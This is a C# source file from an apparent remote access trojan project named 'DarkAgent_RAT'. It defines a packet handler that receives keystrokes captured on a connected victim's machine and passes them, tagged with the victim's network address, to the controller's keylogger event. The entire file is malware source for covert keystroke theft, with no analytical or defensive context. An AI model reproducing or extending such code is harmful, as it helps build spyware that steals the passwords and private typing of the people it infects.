using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Events;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive
{
    class R_KeyStrokes : ReceiveBasePacket
    {
        public R_KeyStrokes(RatClients client, byte[] packet)
            : base(client, packet)
        {
        }

        string KeyStrokes;
        public override void Read()
        {
            KeyStrokes = ReadString();
        }

        public override void Run()
        {
            KeyloggerEventArgs e1 = new KeyloggerEventArgs(KeyStrokes, Client.RemoteEndPoint.ToString());
            KeyloggerEvent.OnKeyStrokes(e1);
        }
    }
}